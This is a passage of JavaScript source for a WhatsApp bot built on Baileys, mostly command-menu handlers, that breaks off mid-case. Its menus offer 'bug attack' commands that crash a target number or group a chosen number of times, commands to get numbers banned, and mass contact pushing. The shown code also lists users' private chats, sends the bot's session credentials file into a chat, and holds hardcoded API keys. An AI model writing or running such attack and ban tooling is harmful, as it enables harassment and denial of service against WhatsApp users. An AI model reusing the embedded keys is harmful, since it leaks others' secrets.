ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬
`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'asupanmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ*

☍ ◦ .ʙᴏᴄɪʟ *ᴀꜱᴜᴘᴀɴ*
☍ ◦ .sᴀɴᴛᴜʏ *ᴀꜱᴜᴘᴀɴ*
☍ ◦ .ɢʜᴇᴀ *ᴀꜱᴜᴘᴀɴ*
☍ ◦ .ᴜᴋʜᴛʏ *ᴀꜱᴜᴘᴀɴ*

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬
`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
    case 'resellermenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ʀᴇsᴇʟʟᴇʀᴍᴇɴᴜ*

☍ ◦ .𝟷ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟸ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟹ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟺ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟻ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬
`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
        case 'menfesmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ᴍᴇɴғᴇs ᴍᴇɴᴜ*

☍ ◦ .ᴍᴇɴғᴇs *@𝟼𝟸xx|ᴘᴇsᴀɴ*
☍ ◦ .ᴄᴏɴғᴇs *@𝟼𝟸xx|ᴘᴇsᴀɴ*

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬
`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'panelmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ᴘᴀɴᴇʟ ᴍᴇɴᴜ*

☍ ◦ .ᴘᴀɴᴇʟ
☍ ◦ .ʟɪsᴛᴜsʀ
☍ ◦ .ᴅᴇʟᴜsʀ
☍ ◦ .ʟɪsᴛsʀᴠ
☍ ◦ .ᴅᴇʟsʀᴠ
☍ ◦ .ʀᴀᴍʟɪsᴛ
☍ ◦ .ᴀᴅᴅᴜsʀ
☍ ◦ .ᴀᴅᴅsʀᴠ
☍ ◦ .ᴄʀᴀᴛᴇᴀᴅᴍɪɴ
☍ ◦ .ʟɪsᴛᴀᴅᴍɪɴ

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'searchmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— sᴇᴀʀᴄʜ ᴍᴇɴᴜ*

☍ ◦ .ᴀɪ *ᴛᴇxᴛ*
☍ ◦ .ᴘɪɴᴛᴇʀᴇsᴛ *ǫᴜᴇʀʏ*
☍ ◦ .ᴛɪᴋᴛᴏᴋ *ᴜʀʟ*
☍ ◦ .ᴀɪɪᴍᴀɢᴇ
☍ ◦ .ᴀɪᴛᴏᴀɴɪᴍᴇ
☍ ◦ .ᴀɪʜᴅ
☍ ◦ .ᴀɪʀᴇᴍᴏᴠᴇʙɢ
☍ ◦ .ᴛᴏᴜʀʟ *ɪᴍᴀɢᴇ*
☍ ◦ .ᴏᴘᴇɴᴀɪ *ᴛᴇxᴛ*

ᴘᴏᴡᴇʀᴇᴅ ʙʏ  *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'bugmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ʙᴜɢ ᴍᴇɴᴜ*

☍ ◦ .ʙᴜɢɴᴜᴍʙᴇʀ
☍ ◦ .ʙᴜɢɢʀᴏᴜᴘ
☍ ◦ .ʙᴀɴɴᴇᴅᴍᴇɴᴜ
☍ ◦ .ᴜɴʙᴀɴᴍᴇɴᴜ
☍ ◦ .ʙᴜɢᴇᴍᴏᴊɪ

ᴘᴏᴡᴇʀᴇᴅ ʙʏ  *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'groupmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ᴍᴇɴᴜ ɢʀᴏᴜᴘ*

☍ ◦ .ᴏᴡɴᴇʀ
☍ ◦ .ǫᴄ *ᴛᴇᴋs*
☍ ◦ .ᴛᴛs *ᴛᴇᴋs*
☍ ◦ .sᴛɪᴄᴋᴇʀ *ʀᴇᴘʟʏ ɪᴍᴀɢᴇ*
☍ ◦ .ʟɪɴᴋɢʀᴏᴜᴘ
☍ ◦ .ᴛᴏᴛᴀɢ
☍ ◦ .ʜɪᴅᴇᴛᴀɢ *ᴛᴇᴋs*
☍ ◦ .ᴀᴅᴅ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴋɪᴄᴋ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴘʀᴏᴍᴏᴛᴇ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴅᴇᴍᴏᴛᴇ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴀɴᴛɪʟɪɴᴋ *ᴏɴ/ᴏғғ*

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
        case 'cecanmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ᴄᴇᴄᴀɴ ᴍᴇɴᴜ*

☍ ◦ .ᴄʜɪɴᴀ
☍ ◦ .ʟᴏᴋᴀʟ
☍ ◦ .ᴊᴇᴘᴀɴɢ
☍ ◦ .ᴋᴏʀᴇᴀ

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬
`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'ownermenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ᴍᴇɴᴜ ᴏᴡɴᴇʀ*

☍ ◦ .ᴀᴅᴅᴏᴡɴᴇʀ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴅᴇʟᴏᴡɴᴇʀ *ɴᴏᴍᴏʀ*
☍ ◦ .sᴇᴛᴘᴘʙᴏᴛ *ɪᴍᴀɢᴇ*
☍ ◦ .ʟɪsᴛᴘᴄ
☍ ◦ .ɢᴇᴛsᴇsɪ
☍ ◦ .ᴀᴅᴅᴘʀᴇᴍ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴅᴇʟᴘʀᴇᴍ *ɴᴏᴍᴏʀ*

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'pushkontakmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`*— ᴘᴜsʜ ᴋᴏɴᴛᴀᴋ*

☍ ◦ .ᴄᴇᴋɪᴅɢᴄ
☍ ◦ .ᴘᴜsʜᴋᴏɴᴛᴀᴋ *ɪᴅɢᴄ|ᴛᴇxᴛ*
☍ ◦ .ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ𝟸 *ᴛᴇxᴛ*

ᴘᴏᴡᴇʀᴇᴅ ʙʏ  *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'bugnumber':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`_ʟɪsᴛ ᴍᴇɴᴜ ʙᴜɢ ʙʏ *© ғᴀʜʀᴜʟ*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

*— ʙᴜɢ ᴀᴛᴛᴀᴄᴋ ɴᴜᴍʙᴇʀ*

☍ ◦ .ɢᴀs *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴋɪʟʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴄʀᴀsʜ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sʜᴏᴏᴛ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴜɢᴋᴜʏ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴜᴀʀʀ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴋɪʟʟʏᴏᴜ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴏʙʟᴇᴋɪʟʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴛʀɪᴘʟᴇᴋɪʟʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴀᴠᴀɢᴇ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴀɴᴛᴇᴛ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴀɴɢᴇʀ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴇɴɪɴɢɢᴀʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʜᴇᴀᴅsʜᴏᴛ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴛɪ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*

 ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case "buggroup":{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`_ʟɪsᴛ ᴍᴇɴᴜ ʙᴜɢ ʙʏ *© ғᴀʜʀᴜʟ*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

*— ʙᴜɢ ᴀᴛᴛᴀᴄᴋ ɢʀᴏᴜᴘ ᴠ𝟷*

☍ ◦ .ᴋɪʟʟɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴀɴᴛᴇᴛɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ɢᴄᴡᴀᴋᴡᴀᴡ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴛᴏɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴛɪɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴋᴜʏɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴛᴛᴀᴄᴋɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴍᴘᴜsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ɢᴀsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴍᴘᴀsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴀʜᴀʏᴀɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʜᴀᴛɪʜᴀᴛɪɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴄʀᴀsʜɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴛᴜᴄᴋɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ɢᴀɴᴀsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*

*— ʙᴜɢ ᴀᴛᴛᴀᴄᴋ ɢʀᴏᴜᴘ ᴠ𝟸*

☍ ◦ .ʙᴜɢɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sʜᴏᴏᴛɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴏʀʀɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴛᴛᴀᴄᴋɢᴄ𝟷 *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴇɴɪɴɢɢᴀʟɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴛɪɢᴄ𝟷 *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴇʀᴀɴɢɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴏᴍɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʟᴇᴅᴀᴋᴀɴɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴛᴏᴍɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʜᴀɴᴄᴜʀɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴜɢᴢɪʀɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴛᴜᴄᴋɢᴄ𝟸 *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴀᴜɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴜʟᴛɪɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*

 ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case "bannedmenu":{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`_ʟɪsᴛ ᴍᴇɴᴜ ʙᴀɴɴᴇᴅ ʙʏ *© ғᴀʜʀᴜʟ*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

*— ᴍᴇɴᴜ ʙᴀɴɴᴇᴅ*

☍ ◦ .ᴄᴀʟʟ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴏᴜᴛ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴠᴇʀɪғ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴋᴇɴᴏɴ *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟷 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟸 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟹 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟺 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟻 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟼 *ɴᴏᴍᴏʀ*

 ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case "unbanmenu":{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`_LIST MENU UNBANNED BY *© fahrul*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

*— MENU UNBANNED*

☍ ◦ . ${prefix}unbannedv1 *nomor*
☍ ◦ . ${prefix}unbannedv2 *nomor*
☍ ◦ . ${prefix}unbannedv3 *nomor*
☍ ◦ . ${prefix}unbannedv4 *nomor*
☍ ◦ . ${prefix}unbannedv5 *nomor*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
        case "otomatismenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

☍ ◦ . ${prefix}buysc
☍ ◦ . ${prefix}buyakn
☍ ◦ . ${prefix}buysrv 
☍ ◦ . ${prefix}deposit
☍ ◦ . ${prefix}buyprem
☍ ◦ . ${prefix}buyowner

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
//batas menu
        case 'menfes': case 'confess':
if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("You are still in the room")
if (m.isGroup) return reply(mess.private)
if (args.length < 1) return reply(`Use ${prefix+command} number|your message\nExample ${prefix+command} ${global.owner}|Hi Owner`)
if (text > 700) return reply(`The text is too long`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await Biiofc.onWhatsApp(num)
if (cekno.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
if (num === m.sender) return reply(`Cannot Confess To Own Number!!!`)
if (num === botNumber) return reply(`Can't Confess to bot number!!!`)
var nomor = m.sender

const kyuuofc = `Hi, I'm a bot. Someone sent a message to you.

Someone your friend
(Secret Sender)

-------------------------------------->

💌 Message : ${pesan}

-------------------------------------->`

await Biiofc.sendMessage(num,
{ text: kyuuofc,
contextInfo:{
externalAdReply: {
title: namaCreator,
body: 'bodynya',
previewType: "PHOTO",
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
}}},{quoted:m})

await Biiofc.sendMessage(num, {text:`You can also reply to the message by sending a message, if you don't want to reply, please type .leave and enter send button`}, { quoted : m })
lidt = `Success Sending Message
👤 From : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 To : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

⬡──⬡─────────⬡──⬡

Your Message : ${pesan}

⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ CONFESS ] Creating room for: " + sender);
return reply(lidt)
}
break
        case 'aiimage': {
			if (!isPremium && !isOwner) return reply(mess.only.premium)
            if (args.length == 0) return reply(`Membuat gambar dari AI.\n\nContoh :\n${prefix+command} rumah mewah`)
            Biiofc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/dall-e?apikey=57bb4781efeb8afd79ec6a73&text=${args[0]}` }, caption: `${args[0]}` }, {quoted:m})
            }
            break
        case 'listpc': {
                if (!isOwner) return reply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let tekslist = `*🔒 LIST PERSONAL CHAT*\n\n`
                tekslist += `*📱 Total Chat :* ${anu.length} Chat\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    tekslist += `📛 *Nama :* ${nama}\n`
                    tekslist += `👤 *User :* @${i.split('@')[0]}\n`
                    tekslist += `🔗 *Link Chat :* https://wa.me/${i.split('@')[0]}\n\n`
                    tekslist += `──────────────────────\n\n`
                }
                reply(tekslist)
            }
        break
        case 'aihd':
case 'airemovebg': {

const alias = {
    "aihd" : "torch-srgan",
    "airemovebg" : "removebg"
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'SanzV7') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await Biiofc.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    const response = `https://xzn.wtf/api/${aliasCommand}?url=${anu}&apikey=kikyy`

    Biiofc.sendMessage(from, { image: { url: response }, caption: 'nih' }, { quoted: m });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
        
        case 'remini': {
            if (isMedia) {
                    const media = await Biiofc.downloadAndSaveMediaMessage(quoted)
                    const anu = await TelegraPh(media)
                    await 
                    Biiofc.sendMessage(m.chat, { image: { url: `https://api.itsrose.site/image/unblur?url=${anu}&apikey=kyuu` }, caption: `Sukses membuat hd` }, { quoted: m })
                } else {
                reply('Reply gambar nya bang')
                }
            }
            break
        case 'jadianime': 
case 'aitoanime': {
if (`${global.wtf}` == 'SanzV7') return m.reply(global.noapikey)

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(global.wait)
  let response = `https://xzn.wtf/api/toanime?url=${util.format(anu)}&apikey=${global.wtf}`

Biiofc.sendMessage(from, { image: { url: response}, caption: command },{ quoted: m });
}
}
break
        case 'getsesi':
            if (!isOwner) return reply(mess.owner)
            reply('Tunggu Sebentar, Sedang mengambil file sesi mu')
            let sesi = await fs.readFileSync('./session/creds.json')
            Biiofc.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'creds.json' }, { quoted: m })
        break
        case 'ytplay':
			case 'play':
				if (!isPremium && !isOwner) return reply(mess.owner)
			if (args.length == 0) return await reply(`Example: ${prefix + command} melukis senja`)
			reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=57bb4781efeb8afd79ec6a73&query=${full_args}`)
				.then(({ data }) => {
					axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=$57bb4781efeb8afd79ec6a73&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
						var caption = `❖ Title    : *${data.result.title}*\n`
						caption += `❖ Size     : *${data.result.size}*`
						Biiofc.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
							Biiofc.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
						})
					})
				})
				.catch(console.error)
			break
			
        case 'lopyu': {
        var menump3 = fs.readFileSync('./all/lopyou1.mp3')
        await Biiofc.sendMessage(m.chat,{audio:menump3,
                                       mimetype: 'audio/mpeg',ptt:true},
                               {quoted})}          
        break
        case 'morning': {
        var menump3 = fs.readFileSync('./all/pagi.mp3')
        await Biiofc.sendMessage(m.chat,{audio:menump3,
                                       mimetype: 'audio/mpeg',ptt:true},
                               {quoted})}          
        break
        case 'sc': {
        var menump3 = fs.readFileSync('./all/menu.mp3')
        await Biiofc.sendMessage(m.chat,{audio:menump3,
                                       mimetype: 'audio/mpeg',ptt:true},
                               {quoted})}          
        break
        case 'totag': {
